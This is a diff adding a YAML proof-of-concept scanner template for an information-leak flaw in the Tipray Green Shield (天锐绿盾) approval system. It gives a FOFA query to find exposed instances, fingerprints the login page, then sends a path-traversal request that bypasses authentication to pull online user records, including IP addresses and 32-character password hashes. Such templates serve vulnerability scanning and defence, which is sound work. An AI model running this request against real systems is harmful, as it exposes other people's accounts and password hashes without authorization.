@@ -1,0 +1,19 @@
+id: poc-yaml-tipray-gsas-findonlineuserforpage-do-info-leak
+info:
+  name: 天锐绿盾审批系统 findOnlineUserForPage.do 信息泄露漏洞
+  severity: medium
+  tags:
+  - 信息泄露
+  finger: 天锐绿盾审批系统
+  fofa: app="TIPPAY-绿盾审批系统"
+requests:
+- method: GET
+  path: /trwfe/login.jsp
+  expression: status_code == 200 && contains(body,"天锐绿盾审批系统")
+- method: GET
+  path: /trwfe/login.jsp/.%2e/user/findOnlineUserForPage.do
+  expression: status_code == 200 && contains(body,"\"user\":") && contains(body,"\"ip\":")
+    && contains(body,"\"firstName\":") && matches(body,"\"password\":\"([a-z0-9]{32})\"")
+    && !contains(body,"<")
+variables: {}
+transport: http
